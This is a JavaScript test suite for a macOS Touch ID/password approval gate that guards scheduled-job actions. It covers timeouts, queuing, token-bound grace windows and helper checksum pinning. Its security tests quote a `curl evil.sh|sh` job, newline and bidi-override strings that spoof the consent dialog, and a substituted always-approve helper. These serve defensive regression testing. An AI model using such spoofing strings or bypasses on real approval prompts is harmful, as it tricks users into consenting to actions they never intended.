import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync, rmSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { join } from 'node:path';
import { tmpData, fakeSpawn, sleep } from './helpers.js';
import {
  createApproval, APPROVAL_CODES, DEFAULT_TIMEOUT_MS, DEFAULT_GRACE_MS, DEFAULT_MAX_QUEUED,
  flattenReason,
} from '../lib/approval.js';

// Every test in this file drives a fake spawn. Nothing here may execute the real
// LaunchBox helper, because the real helper raises a modal system sheet and the
// plan batches every human interaction into Task 13 — an automated suite that
// asks for a fingerprint is a suite nobody can run.
//
// `helperPath` therefore points at a file that *exists* (approval refuses
// without one, before it ever spawns) but is deliberately not executable, so an
// accidental real spawn fails loudly instead of prompting.
function setup({ helper = true, ...opts } = {}) {
  const dir = tmpData();
  const helperPath = join(dir, 'LaunchBox');
  if (helper) writeFileSync(helperPath, 'not a real binary — tests never execute this\n', { mode: 0o600 });
  const spawnFn = fakeSpawn();
  // Injected clock: the grace window is 5 minutes and no test may wait for it.
  let t = Date.UTC(2026, 6, 26, 12, 0, 0);
  const clock = { now: () => t, advance: (ms) => { t += ms; } };
  const approval = createApproval({
    spawnFn, helperPath, now: clock.now, timeoutMs: 60, graceMs: 300_000, platform: 'darwin', ...opts,
  });
  return { approval, spawnFn, clock, helperPath, dir };
}

// Answer the pending dialog the way the measured helper does: exit 0 approves;
// exit 1 carries LAError JSON on stdout; 137 is the SIGKILL of a tampered binary.
async function answer(spawnFn, { code = 0, stdout = null, signal = null, nth = -1 } = {}) {
  await sleep(2);
  const call = spawnFn.calls.at(nth);
  assert.ok(call, 'expected a helper spawn to answer');
  if (stdout) call.child.stdout.emit('data', Buffer.from(stdout));
  call.child.emit('close', code, signal);
  return call;
}

const denialJson = (errorCode = -2) => `${JSON.stringify({ success: false, errorCode, error: 'canceled' })}\n`;

const JOB = {
  action: 'job.create',
  // Written to complete "LaunchBox is trying to …", with the object in
  // typographic quotes — the constraint the spike measured.
  detail: 'create the scheduled job “nightly sweep”, which can run commands on this Mac',
};

test('an approval spawns exactly one dialog, with the reason sentence verbatim', async () => {
  const { approval, spawnFn, helperPath } = setup();
  const pending = approval.request(JOB);
  await answer(spawnFn, { code: 0 });

  assert.deepEqual(await pending, { ok: true });
  assert.equal(spawnFn.calls.length, 1, 'one dialog, not two');
  const { cmd, args } = spawnFn.calls[0];
  assert.equal(cmd, helperPath);
  // `detail` is passed through untouched: it is the human sentence macOS appends
  // to the dialog title, so anything we splice in would be read by the user.
  assert.deepEqual(args, ['--auth', JOB.detail]);
});

test('a denial (LAError -2) reads as approval_denied, not as a broken helper', async () => {
  const { approval, spawnFn } = setup();
  const pending = approval.request(JOB);
  await answer(spawnFn, { code: 1, stdout: denialJson(-2) });

  const r = await pending;
  assert.equal(r.ok, false);
  assert.equal(r.code, 'approval_denied');
});

test('an unknown errorCode fails closed as unavailable rather than as a denial', async () => {
  const { approval, spawnFn } = setup();
  const pending = approval.request(JOB);
  // -8 is biometryLockout. Reading anything-but--2 as "the user said no" would
  // let a broken mechanism masquerade as a decision the user made.
  await answer(spawnFn, { code: 1, stdout: denialJson(-8) });

  const r = await pending;
  assert.equal(r.code, 'approval_unavailable');
  assert.match(r.message, /-8/, 'the raw errorCode survives into the log line');
});

test('an unanswered dialog times out, is killed, and never resolves twice', async () => {
  const { approval, spawnFn } = setup({ timeoutMs: 40 });
  const pending = approval.request(JOB);
  await sleep(2);
  const { child } = spawnFn.calls[0];

  const r = await pending;
  assert.equal(r.ok, false);
  assert.equal(r.code, 'approval_timeout');
  // Killed on the way out: a sheet nobody looked at must not survive to be
  // approved ten minutes later, granting an action we already refused.
  assert.equal(child.killedWith, 'SIGKILL');
  // That kill makes the fake child close(137); the answer must not flip to
  // unavailable behind our back.
  await sleep(5);
  assert.equal((await pending).code, 'approval_timeout');
});

test('a missing helper binary refuses without spawning anything', async () => {
  const { approval, spawnFn } = setup({ helper: false });
  const r = await approval.request(JOB);
  assert.equal(r.ok, false);
  assert.equal(r.code, 'approval_unavailable');
  assert.equal(spawnFn.calls.length, 0, 'nothing to spawn, so nothing was spawned');
  assert.equal(approval.available().ok, false);
});

test('a tampered helper — SIGKILLed, exit 137 — is unavailable, never approved', async () => {
  for (const answered of [{ code: 137 }, { code: null, signal: 'SIGKILL' }]) {
    const { approval, spawnFn } = setup();
    const pending = approval.request(JOB);
    await answer(spawnFn, answered);
    const r = await pending;
    // swiftc's adhoc signature is mandatory on Apple Silicon: strip or patch the
    // binary and the kernel SIGKILLs it. That is the tamper signal, and it must
    // never be mistaken for a success or for a denial.
    assert.equal(r.ok, false, JSON.stringify(answered));
    assert.equal(r.code, 'approval_unavailable', JSON.stringify(answered));
  }
});

test('a helper that will not start at all is unavailable', async () => {
  const { approval, spawnFn } = setup();
  const pending = approval.request(JOB);
  await sleep(2);
  const err = Object.assign(new Error('spawn EACCES'), { code: 'EACCES' });
  spawnFn.calls[0].child.emit('error', err);
  const r = await pending;
  assert.equal(r.code, 'approval_unavailable');
});

test('the queue serialises: a second request waits rather than stacking a dialog', async () => {
  const { approval, spawnFn } = setup({ timeoutMs: 1000 });
  const first = approval.request({ ...JOB, detail: 'create job A' });
  const second = approval.request({ ...JOB, detail: 'create job B' });
  await sleep(5);

  // The whole point: two stacked system sheets is how a person approves the
  // wrong one.
  assert.equal(spawnFn.calls.length, 1, 'only one dialog is open');
  assert.deepEqual(spawnFn.calls[0].args, ['--auth', 'create job A']);

  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await first, { ok: true });

  // Only now does the second one get its turn.
  await sleep(5);
  assert.equal(spawnFn.calls.length, 2);
  assert.deepEqual(spawnFn.calls[1].args, ['--auth', 'create job B']);
  await answer(spawnFn, { code: 1, stdout: denialJson(-2) });
  assert.equal((await second).code, 'approval_denied');
});

test('the queue is bounded — anything beyond it is approval_busy, immediately', async () => {
  const { approval, spawnFn } = setup({ timeoutMs: 1000 });
  assert.equal(DEFAULT_MAX_QUEUED, 2, 'one dialog open plus a short queue');

  const inFlight = approval.request({ ...JOB, detail: 'create job A' });
  const waiting = [
    approval.request({ ...JOB, detail: 'create job B' }),
    approval.request({ ...JOB, detail: 'create job C' }),
  ];
  // Fourth: the queue is full. Refused without waiting and without a dialog, so
  // the client gets a 409 it can explain instead of a request that hangs.
  const busy = await approval.request({ ...JOB, detail: 'create job D' });
  assert.equal(busy.ok, false);
  assert.equal(busy.code, 'approval_busy');
  assert.equal(spawnFn.calls.length, 1);

  // Drain, so the test leaves nothing pending.
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await inFlight, { ok: true });
  for (const p of waiting) {
    await answer(spawnFn, { code: 1, stdout: denialJson(-2) });
    assert.equal((await p).code, 'approval_denied');
  }
});

test('grace suppresses a second prompt only when grace:true is passed', async () => {
  const { approval, spawnFn } = setup();

  // 1. An ungated-by-grace approval earns nothing: the actions that pass no
  //    grace flag (cleanup, uninstall, activation) must not open a window for
  //    the ones that do.
  const ungraced = approval.request({ ...JOB, token: 'tok-a' });
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await ungraced, { ok: true });

  // 2. So a grace-eligible request still prompts…
  const earning = approval.request({ ...JOB, token: 'tok-a', grace: true });
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await earning, { ok: true });
  assert.equal(spawnFn.calls.length, 2);

  // 3. …and only now is a second grace-eligible request waved through.
  const graced = await approval.request({ ...JOB, token: 'tok-a', grace: true });
  assert.deepEqual(graced, { ok: true, graced: true });
  assert.equal(spawnFn.calls.length, 2, 'no third dialog');

  // 4. A request that does not ask for grace prompts anyway, window or not.
  const destructive = approval.request({ action: 'cleanup', detail: 'delete every job', token: 'tok-a' });
  await sleep(2);
  assert.equal(spawnFn.calls.length, 3, 'cleanup prompts even inside the window');
  await answer(spawnFn, { code: 1, stdout: denialJson(-2) });
  assert.equal((await destructive).code, 'approval_denied');
});

test('grace is bound to the token that earned it — a second caller cannot ride it', async () => {
  const { approval, spawnFn } = setup();

  const earning = approval.request({ ...JOB, token: 'tok-a', grace: true });
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await earning, { ok: true });

  // The whole reason grace is keyed by token: a grace window is an attack
  // window, and a *different* holder must not inherit the human's approval.
  const other = approval.request({ ...JOB, token: 'tok-b', grace: true });
  await sleep(2);
  assert.equal(spawnFn.calls.length, 2, 'tok-b must be prompted for itself');
  await answer(spawnFn, { code: 1, stdout: denialJson(-2) });
  assert.equal((await other).code, 'approval_denied');

  // tok-a's window is untouched by tok-b's refusal.
  assert.deepEqual(await approval.request({ ...JOB, token: 'tok-a', grace: true }), { ok: true, graced: true });

  // A request with no token cannot be bound to anything, so it never rides.
  const anonymous = approval.request({ ...JOB, grace: true });
  await sleep(2);
  assert.equal(spawnFn.calls.length, 3, 'no token, no grace');
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await anonymous, { ok: true });
});

test('grace expires after graceMs, measured on the injected clock', async () => {
  const { approval, spawnFn, clock } = setup({ graceMs: 300_000 });

  const earning = approval.request({ ...JOB, token: 'tok-a', grace: true });
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await earning, { ok: true });

  clock.advance(299_999);
  assert.deepEqual(await approval.request({ ...JOB, token: 'tok-a', grace: true }), { ok: true, graced: true });
  assert.equal(spawnFn.calls.length, 1);

  // One millisecond past the window and the human is asked again. Fixed from the
  // approval, not sliding: a sliding window could be held open indefinitely by
  // editing jobs, which is exactly the window an attacker wants.
  clock.advance(2);
  const expired = approval.request({ ...JOB, token: 'tok-a', grace: true });
  await sleep(2);
  assert.equal(spawnFn.calls.length, 2, 'the window closed');
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await expired, { ok: true });
});

test('a non-darwin platform allows the action, degraded, and spawns nothing', async () => {
  for (const platform of ['linux', 'win32']) {
    const { approval, spawnFn } = setup({ platform });
    // The one place this design fails OPEN, on the user's explicit call that
    // macOS-only is acceptable for now. `degraded` is how the UI and the log say
    // so, and it must never be mistaken for protection that exists.
    assert.deepEqual(await approval.request(JOB), { ok: true, degraded: true });
    assert.equal(spawnFn.calls.length, 0, `${platform} must not spawn a macOS helper`);

    const avail = approval.available();
    assert.equal(avail.ok, false);
    assert.equal(avail.degraded, true);
    assert.match(avail.reason, new RegExp(platform));
  }
});

test('available() distinguishes ready, not-installed and unsupported', () => {
  assert.equal(setup().approval.available().ok, true);
  assert.equal(setup({ helper: false }).approval.available().degraded, false, 'a missing helper fails closed, not degraded');
  assert.equal(setup({ platform: 'linux' }).approval.available().degraded, true);
});

test('every refusal code is one the client has copy for', async () => {
  assert.deepEqual([...APPROVAL_CODES].sort(),
    ['approval_busy', 'approval_denied', 'approval_timeout', 'approval_unavailable']);

  // Collected by driving the real paths rather than hand-listed, so a new failure
  // mode that invents its own code fails here instead of reaching a client that
  // has no wording for it.
  const seen = new Set();
  {
    const { approval, spawnFn } = setup();
    const p = approval.request(JOB);
    await answer(spawnFn, { code: 1, stdout: denialJson(-2) });
    seen.add((await p).code);
  }
  {
    const { approval } = setup({ timeoutMs: 30 });
    seen.add((await approval.request(JOB)).code);
  }
  {
    const { approval } = setup({ helper: false });
    seen.add((await approval.request(JOB)).code);
  }
  {
    const { approval, spawnFn } = setup({ timeoutMs: 500, maxQueued: 0 });
    const held = approval.request(JOB);
    seen.add((await approval.request(JOB)).code);
    await answer(spawnFn, { code: 0 });
    await held;
  }

  assert.deepEqual([...seen].sort(), [...APPROVAL_CODES].sort(), 'every code is reachable, and no others exist');
});

test('the shipped bounds are the measured ones', () => {
  // 180s because a password approval consumed 67.6s of the original 120s bound;
  // 300s because that is the grace window the spec argues for. Pinned here
  // because no test can afford to observe either default in real time.
  assert.equal(DEFAULT_TIMEOUT_MS, 180_000);
  assert.equal(DEFAULT_GRACE_MS, 300_000);
});

test('the approval event reports what happened, and never how', async () => {
  const { approval, spawnFn } = setup();
  const events = [];
  approval.events.on('prompt', (e) => events.push(['prompt', e]));
  approval.events.on('approval', (e) => events.push(['approval', e]));

  const pending = approval.request(JOB);
  await answer(spawnFn, { code: 0 });
  await pending;

  assert.deepEqual(events.map(([n]) => n), ['prompt', 'approval']);
  const [, done] = events[1];
  assert.equal(done.action, 'job.create');
  assert.equal(done.result, 'approved');
  assert.equal(done.code, null);
  // LocalAuthentication does not report which factor was used, so nothing here
  // may imply a fingerprint. The audit line says "approved at T" and no more.
  assert.equal(JSON.stringify(events).toLowerCase().includes('finger'), false);
  // The token is a live credential; an event stream that carries it is a log
  // file that leaks it.
  const withToken = approval.request({ ...JOB, token: 'tok-secret', grace: true });
  await answer(spawnFn, { code: 0 });
  await withToken;
  assert.equal(JSON.stringify(events).includes('tok-secret'), false);
});

// ---------------- pinned against the REAL binary's output
//
// Every other test here drives a fake that emits a payload shape *we* chose. That
// verifies the mapping but not that the mapping matches reality. These read
// tests/fixtures/localauth-payloads.json, which holds what the compiled helper
// actually printed — the approve and deny entries produced by a human at the real
// system dialog. If the Swift side ever changes its output, this fails.
test('the real helper payloads map to the right outcomes', async () => {
  const real = JSON.parse(readFileSync(
    new URL('./fixtures/localauth-payloads.json', import.meta.url), 'utf8',
  ));

  for (const key of ['approveTouchId', 'approvePassword']) {
    const { approval, spawnFn } = setup();
    const p = approval.request({ action: 'job.create', detail: 'create a job', token: 't' });
    await answer(spawnFn, { code: real[key].exit, stdout: real[key].stdout });
    assert.deepEqual(await p, { ok: true }, `${key} must be allowed`);
  }

  // Touch ID and password are indistinguishable to us by design: same exit code,
  // same errorCode, differing only in elapsedMs. Asserted so nobody later tries
  // to branch on the factor, which LocalAuthentication does not report.
  assert.notEqual(
    JSON.parse(real.approveTouchId.stdout).elapsedMs,
    JSON.parse(real.approvePassword.stdout).elapsedMs,
  );
  for (const k of ['errorCode', 'success']) {
    assert.equal(JSON.parse(real.approveTouchId.stdout)[k], JSON.parse(real.approvePassword.stdout)[k]);
  }

  {
    const { approval, spawnFn } = setup();
    const p = approval.request({ action: 'cleanup', detail: 'delete everything', token: 't' });
    await answer(spawnFn, { code: real.deny.exit, stdout: real.deny.stdout });
    const out = await p;
    assert.equal(out.ok, false);
    assert.equal(out.code, 'approval_denied', 'a real deny is a denial, not an outage');
  }

  // Bad usage exits 2. It must fail CLOSED as unavailable — never be mistaken for
  // an approval, and never reported as the user having said no.
  {
    const { approval, spawnFn } = setup();
    const p = approval.request({ action: 'job.create', detail: 'create a job', token: 't' });
    await answer(spawnFn, { code: real.badUsage.exit, stdout: real.badUsage.stdout });
    const out = await p;
    assert.equal(out.ok, false);
    assert.equal(out.code, 'approval_unavailable');
  }
});


test('the dialog sentence cannot be spoofed with injected lines', () => {
  // Measured BEFORE the fix, with a stub helper recording its argv: a job name
  // containing newlines rendered extra lines inside the system sheet, so a name
  // could make it read "This is a routine macOS security update. Touch ID to
  // continue." above the real sentence -- and the user would have approved a job
  // running `curl evil.sh|sh` believing it was an OS update. The sheet is the only
  // signal about what is being consented to, so this is spoofing, not cosmetics.
  const evil = 'nightly backup"' + '\n\n' + 'This is a routine macOS security update.'
    + '\n' + 'Touch ID to continue.' + '\n\n' + '(ignore the text below)';
  const flat = flattenReason(`create the scheduled job “${evil}”, which can run commands on this Mac`);

  assert.ok(!flat.includes('\n'), 'no newline may survive into the dialog');
  assert.ok(!new RegExp('[' + '\u0000-\u001f' + ']').test(flat), 'no control character may survive');
  assert.ok(flat.startsWith('create the scheduled job'), 'the real verb still leads the sentence');
  assert.ok(flat.includes('routine macOS security update'),
    'flattened, not censored -- silently dropping the words would be its own lie');

  // Bidi overrides reorder the visible sentence without changing its characters.
  const rlo = String.fromCharCode(0x202e);
  const isolates = String.fromCharCode(0x2066) + 'b' + String.fromCharCode(0x2069);
  assert.equal(flattenReason('delete everything' + rlo + 'harmless'), 'delete everythingharmless');
  assert.equal(flattenReason('a' + isolates + 'c'), 'abc');

  // Unicode line/paragraph separators count too.
  assert.equal(flattenReason('a' + String.fromCharCode(0x2028) + 'b'), 'a b');

  // Padding must not push the meaningful text out of a small sheet.
  assert.ok(flattenReason(`create x${' '.repeat(500)}and also y`).length < 60);

  // Capped, keeping the head.
  const long = flattenReason(`create the scheduled job “${'x'.repeat(5000)}”`);
  assert.ok(long.length <= 160, `expected <= 160, got ${long.length}`);
  assert.ok(long.startsWith('create the scheduled job'));

  assert.equal(flattenReason(''), '');
  assert.equal(flattenReason(null), '');
});


test('the flattened sentence is what actually reaches the helper argv', async () => {
  // The sibling test above exercises flattenReason directly, which verifies the
  // function but NOT that anything calls it — and a mutation check proved that
  // gap: removing the call from reasonFor left it green. So this asserts on the
  // argv the helper is really spawned with, which is the only thing macOS renders.
  const { approval, spawnFn } = setup();
  const evil = 'x' + '\n\n' + 'This is a routine macOS security update.' + '\n' + 'Touch ID to continue.';
  const p2 = approval.request({
    action: 'job.create',
    detail: `create the scheduled job “${evil}”, which can run commands on this Mac`,
    token: 't',
  });
  await answer(spawnFn, { code: 0 });
  await p2;

  const args = spawnFn.calls.at(-1).args;
  assert.equal(args[0], '--auth');
  const shown = args[1];
  assert.ok(!shown.includes('\n'),
    `the dialog argv still contains a newline: ${JSON.stringify(shown)}`);
  assert.ok(shown.startsWith('create the scheduled job'));
  assert.ok(shown.endsWith('which can run commands on this Mac'),
    'the clause stating what is granted must survive');
});

test('a queued request cannot ride the approval it waited behind', async () => {
  // The attack this closes: an attacker holding the same capability token (a
  // browser extension reading localStorage, a container port-forward, an ssh -R)
  // fires a gated request and takes the dialog. The user's own request queues
  // behind it. The user approves what they believe is their own action. Before
  // the fix, the attacker's grace then waved the user's queued request through
  // with NO dialog — one fingerprint, two actions, and the UI showed exactly what
  // the user expected.
  //
  // Both requests carry the SAME token, because there is only one.
  const { approval, spawnFn } = setup();
  const attacker = approval.request({ action: 'job.create', detail: 'create the attacker job', token: 'the-only-token', grace: true });
  await sleep(5);
  const victim = approval.request({ action: 'job.create', detail: 'create the user job', token: 'the-only-token', grace: true });
  await sleep(5);

  assert.equal(spawnFn.calls.length, 1, 'only the first request should have a dialog open');

  // The user approves the dialog that is showing — the attacker's.
  await answer(spawnFn, { code: 0, nth: 0 });
  assert.deepEqual(await attacker, { ok: true });

  // The victim's request must now raise its OWN dialog rather than being waved
  // through by the grace the attacker's approval opened.
  await sleep(10);
  assert.equal(spawnFn.calls.length, 2,
    'the queued request must earn its own approval, not inherit one');
  await answer(spawnFn, { code: 1, stdout: '{"errorCode":-2}', nth: -1 });
  const out = await victim;
  assert.equal(out.ok, false);
  assert.equal(out.code, 'approval_denied');
});

test('grace still works for the sequential case it exists for', async () => {
  // The legitimate use: a human edits several jobs in a row. Those requests are
  // sequential, so they never queue behind one another and grace is honoured at
  // entry. Removing the queue re-check must not have broken this.
  const { approval, spawnFn } = setup();
  const first = approval.request({ action: 'job.create', detail: 'create job one', token: 't', grace: true });
  await answer(spawnFn, { code: 0 });
  assert.deepEqual(await first, { ok: true });

  const second = await approval.request({ action: 'job.edit', detail: 'change job one', token: 't', grace: true });
  assert.equal(second.ok, true);
  assert.equal(spawnFn.calls.length, 1, 'the second edit rode the window with no new dialog');
});

test('a substituted helper binary is refused, not trusted', async () => {
  // Before the pin, available() was existsSync and nothing more, and exit 0 from
  // the helper WAS the approval — so replacing the binary with one that exits 0
  // approved every gated action silently, forever. swiftc signs a replacement just
  // as validly, so the adhoc signature does not help: it detects patching a signed
  // binary, not substituting a fresh one.
  const dir = tmpData();
  const helperPath = join(dir, 'LaunchBox');
  writeFileSync(helperPath, '#!/bin/sh\nexit 0\n');
  writeFileSync(`${helperPath}.sha256`, `${'0'.repeat(64)}\n`);

  const approval = createApproval({ spawnFn: fakeSpawn(), helperPath, platform: 'darwin' });
  const state = approval.available();
  assert.equal(state.ok, false);
  assert.equal(state.tampered, true);
  assert.match(state.reason, /checksum/);

  const out = await approval.request({ action: 'job.create', detail: 'create a job', token: 't' });
  assert.equal(out.ok, false);
  assert.equal(out.code, 'approval_unavailable', 'a mismatched helper never means yes');
});

test('a matching pin is accepted, and an absent pin is permissive but flagged', async () => {
  const dir = tmpData();
  const helperPath = join(dir, 'LaunchBox');
  const body = '#!/bin/sh\nexit 0\n';
  writeFileSync(helperPath, body);
  const digest = createHash('sha256').update(readFileSync(helperPath)).digest('hex');
  writeFileSync(`${helperPath}.sha256`, `${digest}  LaunchBox\n`);

  const ok = createApproval({ spawnFn: fakeSpawn(), helperPath, platform: 'darwin' }).available();
  assert.equal(ok.ok, true, 'the recorded checksum matches');
  assert.equal(ok.unpinned, false);

  // An older install has no pin file. Absence is not evidence of tampering, so it
  // stays permissive — but it is reported, because it is a weaker posture.
  rmSync(`${helperPath}.sha256`);
  const unpinned = createApproval({ spawnFn: fakeSpawn(), helperPath, platform: 'darwin' }).available();
  assert.equal(unpinned.ok, true);
  assert.equal(unpinned.unpinned, true);
});

test('the platform is snapshotted at module load, out of reach of an extension', () => {
  // Extensions are unsigned local .js loaded in-process by main(), which runs after
  // this module is evaluated. Reading process.platform lazily would let one do
  // Object.defineProperty(process, 'platform', {value:'linux'}) and drop the whole
  // layer into the documented fail-OPEN degraded path.
  const original = process.platform;
  try {
    Object.defineProperty(process, 'platform', { value: 'linux', configurable: true });
    const a = createApproval({ spawnFn: fakeSpawn(), helperPath: '/nope', });
    assert.equal(a.available().degraded, false,
      'a late platform change must not reach the degraded path');
  } finally {
    Object.defineProperty(process, 'platform', { value: original, configurable: true });
  }
});
